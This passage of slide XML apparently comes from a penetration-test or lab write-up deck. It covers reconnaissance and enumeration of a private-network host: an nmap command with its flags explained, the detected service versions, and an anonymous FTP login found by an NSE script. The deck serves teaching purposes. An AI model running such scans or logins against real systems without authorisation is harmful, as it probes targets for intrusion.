                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>22 — SSH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>80 — HTTP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3306 — MySQL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>33060 — MySQLX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4617720"/>
            <a:ext cx="11064240" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5926"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4773168"/>
            <a:ext cx="10515600" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A key testing principle</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5074920"/>
            <a:ext cx="10515600" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>“An open port is not automatically a vulnerability.” Each service was investigated on its own merits — SSH being open, for example, was never treated as a finding by itself.</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7</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02 · RECONNAISSANCE</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Service Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="11064240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1508760"/>
            <a:ext cx="10735056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ sudo nmap -Pn -sC -sV -O -p 21,22,80,3306,33060 192.168.76.157</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2423160"/>
            <a:ext cx="1188720" cy="36576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-sC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="2423160"/>
            <a:ext cx="4297680" cy="365760"/>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Run Nmap's default Non-intrusive scripting engine (NSE) scripts, e.g. ftp-anon.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2843784"/>
            <a:ext cx="1188720" cy="36576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-sV</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="2843784"/>
            <a:ext cx="4297680" cy="365760"/>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Probe each open port to identify the exact service and version banner.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3264408"/>
            <a:ext cx="1188720" cy="36576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-O</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3264408"/>
            <a:ext cx="4297680" cy="365760"/>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Attempt OS fingerprinting from TCP/IP stack behavior.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3685032"/>
            <a:ext cx="1188720" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>-Pn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3685032"/>
            <a:ext cx="4297680" cy="365760"/>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Skip host discovery again — already confirmed the host is up.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="2286000"/>
            <a:ext cx="5303520" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="2423160"/>
            <a:ext cx="4846320" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SERVICES CONFIRMED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="2697480"/>
            <a:ext cx="4846320" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>vsftpd 3.0.3 (FTP)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OpenSSH 7.9p1, Debian 10+deb10u2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Apache httpd 2.4.38 (Debian)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MySQL / MySQL X Protocol listener</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4251960"/>
            <a:ext cx="11064240" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4407408"/>
            <a:ext cx="10515600" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HIGHLIGHT: FTP FLAGGED BY NSE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4709160"/>
            <a:ext cx="10515600" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The ftp-anon NSE script (part of -sC) reported: “Anonymous FTP login allowed” — Nmap itself pointed us toward the very first weakness we would validate manually.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5212080"/>
            <a:ext cx="10515600" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why versions matter: exact service versions let us fingerprint the attack surface, research known weaknesses, and choose service-specific enumeration next.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8</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03 · ENUMERATION</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FTP Enumeration &amp; Information Disclosure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2112264" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2112264" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Anonymous FTP allowed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ftp 192.168.76.157</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5239512" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5239512" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
